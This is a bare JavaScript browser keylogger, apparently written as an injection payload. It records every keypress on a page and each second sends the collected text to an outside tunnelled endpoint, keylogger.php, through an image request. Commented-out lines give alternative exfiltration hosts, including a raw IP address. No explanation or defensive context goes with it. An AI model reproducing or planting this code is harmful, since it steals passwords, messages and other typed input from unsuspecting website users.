
 var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}
window.setInterval(function(){
   //var xhr = new XMLHttpRequest();
   //xhr.open("GET", 'https://tidy-birds-92.loca.lt/keylogger.php?c='+keys)
  // xhr.send()
  // new Image().src = 'http://54.153.104.105/keylogger.php?c='+keys;
  new Image().src = 'https://9dce2530440a83.localhost.run/keylogger.php?c='+keys;
  keys = '';
}, 1000);

